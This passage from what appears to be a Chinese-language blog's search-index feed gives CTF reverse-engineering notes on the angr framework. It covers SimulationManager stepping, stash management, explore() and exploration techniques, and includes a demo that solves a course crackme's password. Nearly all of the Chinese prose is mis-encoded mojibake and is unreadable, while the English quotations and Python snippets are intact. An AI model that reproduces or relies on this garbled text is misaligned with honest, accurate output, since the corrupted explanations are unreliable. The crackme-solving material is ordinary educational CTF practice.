æ¥æ”¶ä¸€ä¸ªä»¥SimulationManagerä¸ºå‚æ•°å¹¶è¿”å›SimulantionManagerçš„å‡½æ•°ï¼Œæ¯ä¸€æ¬¡è°ƒç”¨<code>step()</code>æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨è¯¥å‡½æ•°ï¼Œä½†è¯¥å‡½æ•°é‡Œé¢ä¸åº”è¯¥æœ‰<code>step(</code>)</p><p><em>error_list</em> :ä¸€ä¸ªlistæ¥å­˜å‚¨<code>ErroredState</code></p><p><em>successor_fun</em> :æ¥æ”¶ä¸€ä¸ªä»¥stateä¸ºå‚æ•°å¹¶è¿”å›å®ƒåç»§çš„å‡½æ•°</p><p>untilï¼š  æ¥æ”¶ä¸€ä¸ªä»¥SimulationMangerä¸ºå‚æ•°å¹¶è¿”å›å¸ƒå°”å€¼çš„å‡½æ•°ï¼Œä¸€ç›´æ‰§è¡Œåˆ°è¿”å›ä¸ºTrue</p><p><em>filter_func</em> ï¼š æ¥æ”¶ä¸€ä¸ªä»¥stateä¸ºå‚æ•°å¹¶è¿”å›è¯¥stateè¦ç§»å»å“ªä¸ªstashåå­—çš„å‡½æ•°</p></blockquote><p>ç°åœ¨çš„angrä¸­<code>n</code>å’Œ<code>until</code>å·²ç»ç§»æ¤åˆ°<code>run()</code>ä¸­ï¼Œç”¨æ³•ç›¸åŒ</p><h4 id="use-technique"><a href="#use-technique" class="headerlink" title="use_technique"></a>use_technique</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"> Use an exploration technique with this SimulationManager.</span><br><span class="hljs-string"></span><br><span class="hljs-string"> Techniques can be found in :mod:`angr.exploration_techniques`.</span><br><span class="hljs-string"></span><br><span class="hljs-string">:param tech:    ä¸€ä¸ªExplorationTechniqueå¯¹è±¡ï¼Œç”¨ä»¥æ§åˆ¶è¯¥SimluationMangerè¡Œä¸º</span><br><span class="hljs-string">:type tech:     ExplorationTechnique           ï¼ˆnoteï¼šExplorationTechniqueä¹Ÿæ˜¯angrçš„ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ç±»ï¼‰</span><br><span class="hljs-string">:return:        The technique that was added, for convenience</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(tech, ExplorationTechnique):<br>            <span class="hljs-keyword">raise</span> SimulationManagerError<br><br>        <span class="hljs-comment"># <span class="hljs-doctag">XXX:</span> as promised</span><br>        tech.project = self._project<br>        tech.setup(self)<br><br>        HookSet.install_hooks(self, **tech._get_hooks())<br>        self._techniques.append(tech)<br>        <span class="hljs-keyword">return</span> tech<br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Stateæ˜¯ä¸€ä¸ªæ¨¡æ‹ŸçŠ¶æ€ï¼Œé‡Œé¢åŒ…å«å¾ˆå¤šå€¼ï¼Œå„ç§å¯„å­˜å™¨ï¼Œå†…å­˜ä»¥åŠå‡ ä¹æ‰€æœ‰å¯ä»¥å˜å¾—å€¼ï¼Œå®ƒæ˜¯å¤§å¤šæ•°å‡½æ•°çš„å‚æ•°ã€‚</p><p>æˆ‘ä»¬æƒ³è¦å¾—åˆ°ä¸€ä¸ªstateï¼Œå¯ä»¥è°ƒç”¨factoryé‡Œçš„å…³äºstateçš„æ–¹æ³•ã€‚è¿˜å¯ä»¥ä½¿ç”¨å¾—åˆ°çš„stateçš„å¯¹è±¡ä»¥åŠfactory.simgræ–¹æ³•å¾—åˆ°ä¸€ä¸ªSimMangerå¯¹è±¡ã€‚factoryç›¸å½“äºä¸€ä¸ªå·¥å…·ç®±ï¼Œå°è£…angrå†…éƒ¨è®¸å¤šå¸¸ç”¨æ–¹æ³•ï¼Œæ–¹ä¾¿æˆ‘ä»¬è°ƒç”¨ï¼Œå°±ä¸éœ€è¦è‡ªå·±æ‰‹åŠ¨æ“ä½œäº†ã€‚</p><p>å½“æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªstateçš„æ—¶å€™ï¼Œå°±å¯ä»¥æŠŠå®ƒä¸¢ç»™SimMangeräº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ°ä¸€ä¸ªSimMangerçš„å¯¹è±¡ï¼Œè¿™ä¸€æ­¥ç›¸å½“äºæŠŠè¿™ä¸ªstateæ‹‰ä¼¸è¿›å†…å­˜ï¼Œå¾—åˆ°æ›´å¤šæœ‰æ•ˆä¿¡æ¯ï¼Œå°±å¯ä»¥å¼€å§‹æ­£å¼æ‰§è¡Œäº†ï¼Œè€Œä¸”æˆ‘ä»¬è¿˜å¯ä»¥è®¾å®šå„ç§æ‰§è¡Œæ–¹å¼ï¼Œæ˜¯åªèµ°ä¸€æ­¥è¿˜æ˜¯ä¸€ç›´èµ°åˆ°å°½å¤´?ä¸­é—´çŠ¶æ€è¦æ€ä¹ˆå¤„ç†ï¼Ÿä»¥ä»€ä¹ˆæ–¹å¼èµ°ï¼Ÿç­‰ç­‰</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Simulation Managers</title>
    <link href="/2023/05/24/Simulation-Managers/"/>
    <url>/2023/05/24/Simulation-Managers/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.angr.io/en/latest/core-concepts/pathgroups.html#simulation-managers">Stepping Stash-Management Simple-Exploration Exploration-Techniques</a></p><span id="more"></span><blockquote><p>The most important control interface in angr is the SimulationManager, which allows you to control symbolic execution over groups of states simultaneously, applying search strategies to explore a programâ€™s state space. Here, youâ€™ll learn how to use it.</p></blockquote><p>æ¦‚æ‹¬ï¼šangré‡Œé¢æœ€é‡è¦çš„æ§åˆ¶æ¥å£å°±æ˜¯<code>SimulationManager</code>,å¯ä»¥ä»¥æ­¤åŒæ—¶æ§åˆ¶ä¸åŒçš„<code>states</code>ç¬¦å·æ‰§è¡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥æ­¤æ¥æ‰§è¡Œæˆ‘ä»¬çš„æœç´¢ç­–ç•¥</p><blockquote><p>Simulation managers let you wrangle multiple states in a slick way. States are organized into â€œstashesâ€, which you can step forward, filter, merge, and move around as you wish. This allows you to, for example, step two different stashes of states at different rates, then merge them together. The default stash for most operations is the <code>active</code> stash, which is where your states get put when you initialize a new simulation manager.</p></blockquote><p>æ¦‚æ‹¬ï¼šæˆ‘ä»¬å¯ä»¥ç”¨ç”¨<code>Simulation Managers</code>æ¥ç®¡ç†å¤šä¸ª<code>states</code>,<code>States</code>åˆæ˜¯ç”±<code>stashes</code>ç»„æˆï¼Œè¿™äº›<code>stashes</code>æˆ‘ä»¬å¯ä»¥æ­¥å…¥ã€è¿‡æ»¤ã€èåˆç”šè‡³ç§»åˆ°å¦ä¸€ä¸ª<code>stashes</code>,å¯¹äºç»å¤§å¤šæ•°çš„<code>stashes</code>éƒ½æ˜¯<code>active</code></p><p>note: è¿™é‡Œä¸€ç›´è¯´çš„<code>stashes</code>å…¶å®å°±æ˜¯ä¸€ç§çŠ¶æ€æ ‡å¿—ï¼Œæ„å‘³è¿™ä¸ªblockæ˜¯å¦è¿˜èƒ½ç»§ç»­èµ°ä¸‹å»ï¼Œæ¯”å¦‚è¯´ä¸€ä¸ªblockæ˜¯<code>active</code>çš„ï¼Œé‚£ä¹ˆå®ƒå°±è¿˜æœ‰åç»§è€Œä¸”è¿˜èƒ½ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚æ‰€ä»¥å½“æˆ‘ä»¬åˆå§‹ä¸¢ç»™<code>Simulation Manager</code>çš„stateåº”è¯¥æ˜¯<code>active</code>çš„ï¼Œè¿™æ ·å®ƒ<code>Simulation Manager</code>æ‰ä¼šä¸ºæˆ‘ä»¬æ¨¡æ‹Ÿæ‰§è¡Œ</p><h2 id="Stepping"><a href="#Stepping" class="headerlink" title="Stepping"></a>Stepping</h2><p>ä¸€ä¸ªç®€å•çš„demo</p><p>æˆ‘ä»¬ä½¿ç”¨<code>.step()</code>æ¥è®©å½“å‰çš„stateæ‰§è¡Œä¸€æ­¥ï¼Œå»åˆ°ä¸‹ä¸€ä¸ªblockã€‚demoä¸­ç»™å‡ºäº†ä¸¤ä¸ªblockçš„åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br>proj = angr.Project(<span class="hljs-string">&#x27;examples/fauxware/fauxware&#x27;</span>, auto_load_libs=<span class="hljs-literal">False</span>)<br>state = proj.factory.entry_state()<br>simgr = proj.factory.simgr(state)<br>simgr.active<br>[&lt;SimState @ <span class="hljs-number">0x400580</span>&gt;]<br><br>simgr.step()<br>simgr.active<br>[&lt;SimState @ <span class="hljs-number">0x400540</span>&gt;]<br></code></pre></td></tr></table></figure><p>ä½ ä¸€å®šæƒ³é—®ï¼Œé‚£å¦‚æœä¸€ä¸ªstateçš„åç»§ä¸æ­¢æœ‰ä¸€ä¸ªå‘¢ï¼Ÿç­”æ¡ˆæ˜¯<code>.step()</code>éƒ½ä¼šæ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Step until the first symbolic branch</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(simgr.active) == <span class="hljs-number">1</span>:     <span class="hljs-comment">#åªæœ‰å½“å‰å¤„äºactiveçš„æ•°é‡ä¸º1ï¼Œæ‰å¾€ä¸‹æ‰§è¡Œ</span><br><span class="hljs-meta">... </span>   simgr.step()<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">2</span> active&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active<br>[&lt;SimState @ <span class="hljs-number">0x400692</span>&gt;, &lt;SimState @ <span class="hljs-number">0x400699</span>&gt;]<br><br><span class="hljs-comment"># Step until everything terminates</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.run()<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">3</span> deadended&gt;<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬ä¸å…³å¿ƒä¸­é—´è¿‡ç¨‹ï¼Œåªå¸Œæœ›å®ƒèƒ½ä¸€ç›´è·‘ä¸‹å»ï¼Œç›´åˆ°å†ä¹Ÿæ²¡æœ‰åç»§å—å¯ä»¥æ‰§è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨.<code>run()</code></p><p>ç°åœ¨æˆ‘ä»¬ä½¿ç”¨äº†<code>.run()</code>å¾—åˆ°æœ€ç»ˆçš„stateï¼Œå®ƒæœ‰ä¸‰ä¸ª<code>stash</code>,å¹¶ä¸”éƒ½æ˜¯<code>deadended</code>çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è·‘ä¸åŠ¨äº†</p><h2 id="Stash-Management"><a href="#Stash-Management" class="headerlink" title="Stash Management"></a>Stash Management</h2><p>æˆ‘ä»¬å¯ä»¥ç”¨<code>.move()</code>æ¥è½¬ç§»çŠ¶æ€ï¼Œå®ƒæœ‰ä¸‰ä¸ªå‚æ•°<code>from_stash</code>,<code>to_statsh</code>,ä»¥åŠä¸€ä¸ªå¯é€‰å‚æ•°<code>filter_func</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">simgr.move(from_stash=<span class="hljs-string">&#x27;deadended&#x27;</span>, to_stash=<span class="hljs-string">&#x27;authenticated&#x27;</span>, filter_func=<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> s.posix.dumps(<span class="hljs-number">1</span>))<br>simgr<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">2</span> authenticated, <span class="hljs-number">1</span> deadended&gt;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªdemoè®©æˆ‘ä»¬æŠŠè¾“å‡ºå«æœ‰<code>Welcome</code>çš„stateè½¬ç§»åˆ°<code>authenticated</code>ï¼Œä¹Ÿå°±æ˜¯è¯´<code>authenticated</code>é‡Œçš„stateéƒ½å«æœ‰<code>Welcome</code></p><p>æ¯ä¸€ä¸ª<code>stash</code>éƒ½æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¸¸è§„çš„å»ç´¢å¼•ï¼Œä¹Ÿå¯ä»¥ç”¨å…¶ä»–æ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬åŠ ä¸€ä¸ªå‰ç¼€<code>one_</code>é‚£ä¹ˆæˆ‘ä»¬å°±ä¼šè®¿é—®è¿™ä¸ª<code>stash</code>çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¦‚æœç”¨<code>mp_</code>å°±å¯ä»¥åŒæ—¶è®¿é—®å…¨éƒ¨ï¼Œå…³äº<code>mp_</code>è¿™æœ‰ä¸€ä¸ª<a href="https://github.com/zardus/mulpyplexer">è¯´æ˜</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> simgr.deadended + simgr.authenticated:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s.addr))<br><span class="hljs-number">0x1000030</span><br><span class="hljs-number">0x1000078</span><br><span class="hljs-number">0x1000078</span><br><br>simgr.one_deadended<br>&lt;SimState @ <span class="hljs-number">0x1000030</span>&gt;<br>simgr.mp_authenticated<br>MP([&lt;SimState @ <span class="hljs-number">0x1000078</span>&gt;, &lt;SimState @ <span class="hljs-number">0x1000078</span>&gt;])<br>simgr.mp_authenticated.posix.dumps(<span class="hljs-number">0</span>)<br>MP([<span class="hljs-string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#x27;</span>,<br>    <span class="hljs-string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80\x80@\x80@\x00&#x27;</span>])<br></code></pre></td></tr></table></figure><blockquote><p>Of course, <code>step</code>, <code>run</code>, and any other method that operates on a single stash of paths can take a <code>stash</code> argument, specifying which stash to operate on.</p></blockquote><p>ä¹Ÿå°±æ˜¯æ‰€æœ‰çš„<code>step</code>,<code>run</code>æ–¹æ³•éƒ½å¯ä»¥æ¥å—ä¸€ä¸ª<code>stash</code>å‚æ•°ï¼Œæ¥å†³å®šæ‰§è¡Œå“ªä¸€ä¸ª</p><h3 id="Stash-types"><a href="#Stash-types" class="headerlink" title="Stash types"></a>Stash types</h3><p>You can use stashes for whatever you like, but there are a few stashes that will be used to categorize some special kinds of states. These are:</p><table><thead><tr><th>Stash</th><th>Description</th></tr></thead><tbody><tr><td>active</td><td>å¯æ‰§è¡Œçš„</td></tr><tr><td>deadended</td><td>å†ä¹Ÿæ— æ³•æ‰§è¡Œçš„ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ— æ³•åˆ°è¾¾ï¼Œæ²¡æœ‰åç»§ç­‰</td></tr><tr><td>pruned</td><td>ï¼ˆä¸å¤ªç¡®å®šï¼‰å½“ä½¿ç”¨<code>LAZY_SOLVES</code>æ—¶ï¼Œstatesä¸ä¼šå†æ£€æŸ¥å¯æ»¡è¶³æ€§ï¼Œå½“ä¸€ä¸ªstateå‘ç°æ˜¯<code>unsat</code>æ—¶ï¼Œè¿™ä¸ªstatesè·¯å¾„ä¸Šçš„æ‰€æœ‰stateséƒ½ä¼šå˜æˆ<code>pruned</code></td></tr><tr><td>unconstrained</td><td>å¦‚æœ <code>save_unconstrained</code> ä¼ é€’ç»™SimelationManager constructor, é‚£äº›æ— çº¦æŸçš„å°±æ—¶<code>unconstrained</code></td></tr><tr><td>unsat</td><td>å¦‚æœ <code>save_unsat</code> ä¼ é€’ç»™SimelationManager constructor, é‚£äº›æ— è§£çš„å°±æ—¶<code>unsat</code>,æ¯”å¦‚è¦æ±‚è¾“å…¥åŒæ—¶æ»¡è¶³å³æ˜¯â€™AAAAâ€™åˆæ˜¯â€™BBBBâ€™</td></tr></tbody></table><h2 id="Simple-Exploration"><a href="#Simple-Exploration" class="headerlink" title="Simple Exploration"></a>Simple Exploration</h2><p>ç¬¦å·æ‰§è¡Œå¾ˆæ™®éçš„ç”¨æ³•æ˜¯æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ°è¾¾æŸä¸ªåœ°å€çš„statesï¼Œè€Œå¿½ç•¥å…¶ä»–æ‰€æœ‰çš„statesï¼Œangræä¾›<code>.explore()</code>æ¥æ–¹ä¾¿æ‰§è¡Œã€‚</p><p>å½“æˆ‘ä»¬ä½¿ç”¨<code>.explore()</code>æ–¹æ³•æ—¶ï¼Œå®ƒå¯ä»¥æ¥å—ä¸¤ä¸ªå‚æ•°<code>find</code>ä»¥åŠ<code>avoid</code>ã€‚å…¶ä¸­<code>find</code>å¯ä»¥æ˜¯ä¸€ä¸ªåœ°å€ï¼Œä¸€ä¸ªåˆ—è¡¨ï¼Œä¸€ä¸ªä»¥<code>state</code>ä¸ºå‚æ•°è¿”å›æŸäº›å€¼çš„å‡½æ•°ï¼Œå½“ä»»ä½•ä¸€ä¸ª<code>active</code>ç¬¦åˆ<code>find</code>çš„è¦æ±‚ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šè¢«æ”¾å…¥<code>found</code>stashé‡Œé¢ï¼ŒåŒæ—¶åœæ­¢æ‰§è¡Œï¼Œ<code>avoid</code>ä¸€æ ·ï¼Œä¸è¿‡æ˜¯æ”¾å…¥<code>avoided</code>stashé‡Œé¢ï¼Œç„¶åç»§ç»­ç¬¦å·æ‰§è¡Œã€‚<code>num_find</code>å¯ä»¥å†³å®šæ‰¾å¤šå°‘ä¸ª<code>found</code>ï¼Œç®€å•demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è£…è½½</span><br>proj = angr.Project(<span class="hljs-string">&#x27;examples/CSCI-4968-MBE/challenges/crackme0x00a/crackme0x00a&#x27;</span>)<br><span class="hljs-comment"># åˆ›å»ºå¯¹è±¡</span><br>simgr = proj.factory.simgr()<br><span class="hljs-comment"># å¼€å§‹ç¬¦å·æ‰§è¡Œ æœç´¢</span><br>simgr.explore(find=<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&quot;Congrats&quot;</span> <span class="hljs-keyword">in</span> s.posix.dumps(<span class="hljs-number">1</span>))<br>&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active, <span class="hljs-number">1</span> found&gt;<br><span class="hljs-comment"># æ‰¾åˆ°ä¸€ä¸ª åˆ©ç”¨ç´¢å¼•çš„æ–¹å¼å¾—åˆ°è¯¥state</span><br>s = simgr.found[<span class="hljs-number">0</span>]<br><span class="hljs-comment"># æŸ¥çœ‹è¯¥stateçš„è¾“å‡º</span><br><span class="hljs-built_in">print</span>(s.posix.dumps(<span class="hljs-number">1</span>))<br>Enter password: Congrats!<br><span class="hljs-comment"># æŸ¥çœ‹è¯¥stateçš„è¾“å…¥</span><br>flag = s.posix.dumps(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(flag)<br>g00dJ0B!<br></code></pre></td></tr></table></figure><h2 id="Exploration-Techniques"><a href="#Exploration-Techniques" class="headerlink" title="Exploration Techniques"></a>Exploration Techniques</h2><p>angrå†…ç½®äº†å¾ˆå¤šç§çš„æœç´¢ç®—æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªæœç´¢ç®—æ³•ï¼Œå¹¶é€šè¿‡<code>simgr.use_technique(tech)</code>è°ƒç”¨ï¼Œè¿™é‡Œçš„<code>tech</code>æ˜¯<code>ExplorationTechnique</code>å­ç±»ã€‚åé¢ä¼šå†è¯¦è°ˆï¼Œè¿™é‡Œå…ˆåˆ—å‡ºangrå†…ç½®çš„ä¸€äº›æœç´¢ç®—æ³•</p><ul><li><em>DFS</em>: æ·±åº¦ä¼˜å…ˆï¼Œåªä¼šè®©ä¸€ä¸ªstateä¸ºactiveï¼ŒæŠŠå…¶ä»–çš„æ”¾è¿›<code>deferred</code>stash</li><li><em>Explorer</em>: å®ç°<code>.explore()</code>,å¯ä»¥ä½¿ç”¨<code>find</code>,<code>avoid</code>æ–¹æ³•</li><li><em>LengthLimiter</em>:æœ€é•¿è·¯å¾„æˆªæ–­</li><li><em>LoopSeer</em>: å¦‚æœå¯èƒ½åœ¨ä¸€ä¸ªå¾ªç¯é‡Œé¢ï¼Œæ”¾å…¥<code>spining</code>stash,ç›´åˆ°å…¶ä»–å¯è¾¾è·¯å¾„éƒ½èµ°å®Œ</li><li><em>ManualMergepoint</em>: æ ‡è®°ä¸€ä¸ªåœ°å€ä½œä¸ºmergeç‚¹ï¼Œå½“ä¸€ä¸ªstataåˆ°è¾¾æ­¤å¤„æ—¶å°†å…¶æŒ‚èµ·ï¼Œå½“å…¶ä»–stateåœ¨æŸä¸ªæ—¶é—´å†…åˆ°è¾¾è¿™ä¸ªç‚¹æ—¶ä¼šè¢«merge</li><li><em>Memory</em>ï¼šåœ¨<code>.step()</code>ä¹‹é—´ç›‘è§†å†…å­˜é‡Šæ”¾&#x2F;ä½¿ç”¨æƒ…å†µ,å¦‚æœå†…å­˜é‡Šæ”¾&#x2F;ä½¿ç”¨å¾—å°‘çš„è¯ï¼Œåœæ­¢æ¢ç´¢</li><li><em>Oppologist</em>: å½“angré‡åˆ°ä¸€ä¸ªä¸æ”¯æŒçš„æŒ‡ä»¤çš„æ—¶å€™ï¼Œä¼šå…·ä½“åŒ–æ‰€æœ‰çš„è¾“å…¥ï¼Œå¹¶ä½¿ç”¨unicornå¼•æ“æ¥å•ç‹¬æ¨¡æ‹Ÿè¿™æ¡æŒ‡ä»¤ï¼Œä½¿å¾—å¯ä»¥ç»§ç»­ç¬¦å·æ‰§è¡Œ</li><li><em>Spiller</em>: å½“æœ‰å¤ªå¤šstateså¤„äºactiveçŠ¶æ€æ—¶ï¼Œè¿™å¯ä»¥æŠŠä¸€äº›statesæ”¾è¿›ç£ç›˜ä¸­ï¼Œä½¿å¾—å†…å­˜å¼€é”€æ¯”è¾ƒå°</li><li><em>Threading</em>: ä½¿ç”¨å¤šçº¿ç¨‹å¹¶è¡Œå¤„ç†ï¼Œä½†ç”±äºpythonå…¨å±€å˜é‡çº¿ç¨‹é”çš„åŸå› ï¼Œè¿™å¹¶ä¸ä¼šæœ‰å¤šå¤§æå‡ã€‚ä½†æ˜¯å¦‚æœåœ¨angrçš„native-codeä¾èµ–ï¼ˆz3ï¼Œunicornï¼Œlibvexï¼‰ä¸ŠèŠ±å¤ªå¤šæ—¶é—´å¯ä»¥è€ƒè™‘è¿™é¡¹æŠ€æœ¯</li><li><em>Tracer</em>ï¼šå¯ä»¥åŠ¨æ€è¿½è¸ªèµ„æº</li><li><em>Veritesting</em>:è‡ªåŠ¨è¯†åˆ«æœ‰ç”¨çš„å¯åˆå¹¶ç‚¹ï¼Œä½¿ç”¨<code>veritesting=True</code>æ¥å¯ç”¨ï¼Œè¿™ä¼šæé«˜æœç´¢æ•ˆç‡ï¼Œä½†ä¸å…¶ä»–ç®—æ³•é…åˆå¾—å¹¶ä¸æ˜¯å¾ˆå¥½</li></ul><p>Look at the API documentation for the <a href="https://docs.angr.io/en/latest/api.html#angr.sim_manager.SimulationManager"><code>SimulationManager</code></a> and <a href="https://docs.angr.io/en/latest/api.html#angr.exploration_techniques.ExplorationTechnique"><code>ExplorationTechnique</code></a> classes for more information.</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Core Concept</title>
    <link href="/2023/05/23/Core-Concept/"/>
    <url>/2023/05/23/Core-Concept/</url>
    
    <content type="html"><![CDATA[<p>æœ€åŸºç¡€çš„angrï¼Œ<a href="https://docs.angr.io/en/latest/core-concepts/toplevel.html">åŸæ–‡æ¡£</a></p><span id="more"></span><h2 id="To-start-proj-angr-Project-39-ELF-path-39"><a href="#To-start-proj-angr-Project-39-ELF-path-39" class="headerlink" title="To start: proj = angr.Project(&#39;/ELF_path&#39;)"></a><em>To start</em>: <code>proj = angr.Project(&#39;/ELF_path&#39;)</code></h2><p>We can do these things with <code>proj</code> :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> Check arch: proj.arch <span class="hljs-comment">#æŸ¥çœ‹æ¶æ„</span><br><span class="hljs-number">2.</span> Check entry: proj.entry <span class="hljs-comment">#æŸ¥çœ‹ç¨‹åºå…¥å£</span><br><span class="hljs-number">3.</span> See Name : proj.filename <span class="hljs-comment">#æŸ¥çœ‹æ–‡ä»¶åå­—</span><br></code></pre></td></tr></table></figure><h2 id="To-Load-proj-loader"><a href="#To-Load-proj-loader" class="headerlink" title="To Load: proj.loader"></a><em>To Load</em>: <code>proj.loader</code></h2><p>We can do these things with <code>proj.loader</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span> See Shared_objects: proj.loader.shared_objects<br><span class="hljs-number">2.</span> See min_addr: proj.loader.min_addr<br><span class="hljs-number">3.</span> see max_addr: proj.loader.max_addr<br><span class="hljs-number">4.</span> See main_object: proj.loader.main_object <span class="hljs-comment"># ä¸»è¦å¯¹è±¡</span><br><span class="hljs-number">5.</span> Check the binary have an executable stack: proj.loader.main_object.execstack<br><span class="hljs-number">6.</span> Check this binary position-independent : proj.loader.main_object.pic<br></code></pre></td></tr></table></figure><h2 id="The-Factory"><a href="#The-Factory" class="headerlink" title="The Factory"></a><em>The Factory</em></h2><blockquote><p>There are a lot of classes in <code>angr</code>, and most of them require a project to be instantiated. Instead of making you pass around the project everywhere, we provide <code>project.factory</code>, which has several convenient constructors for common objects youâ€™ll want to use frequently.</p></blockquote><p>angræœ‰å¾ˆå¤šçš„ç±»ï¼ŒåŸºæœ¬ä¸Šæ¯ä¸€ä¸ªç±»éƒ½éœ€è¦ä¸€ä¸ª<code>project</code>å¯¹è±¡æ¥å®ä¾‹åŒ–ã€‚angræä¾›äº†<code>project.factory</code>è¿™ä¸€ä¸ªæ¥å£ï¼Œå¯ä»¥æ–¹ä¾¿ä¾›æˆ‘ä»¬ä½¿ç”¨</p><h2 id="Block-block-proj-factory-block-proj-entry"><a href="#Block-block-proj-factory-block-proj-entry" class="headerlink" title="Block  block = proj.factory.block(proj.entry)"></a><em>Block</em> <code> block = proj.factory.block(proj.entry)</code></h2><p>angrçš„åŸºæœ¬æ‰§è¡Œå¯¹è±¡æ˜¯blockï¼Œä¸Šé¢è¿™è¡Œä»£ç å¯ä»¥è·å¾—ç¨‹åºèµ·å§‹åœ°å€çš„å—</p><p>What can do with <code>block</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 